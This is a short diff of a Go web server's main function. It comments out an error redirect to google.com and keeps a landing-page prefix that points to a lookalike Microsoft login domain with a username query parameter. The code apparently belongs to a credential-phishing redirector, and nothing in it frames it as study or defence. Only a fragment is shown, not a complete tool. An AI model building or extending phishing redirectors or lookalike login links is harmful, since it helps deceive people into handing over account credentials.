@@ -15,7 +15,7 @@ func main() {
 	r.Use(middleware.Logger)
 
 	var (
-		redirectErrorLink = "https://google.com" //ERROR LINK
+		// redirectErrorLink = "https://google.com" //ERROR LINK
 		prefixLandingPage = "https://login-microsoftonline.asn2.xyz/?username="
 	)
 
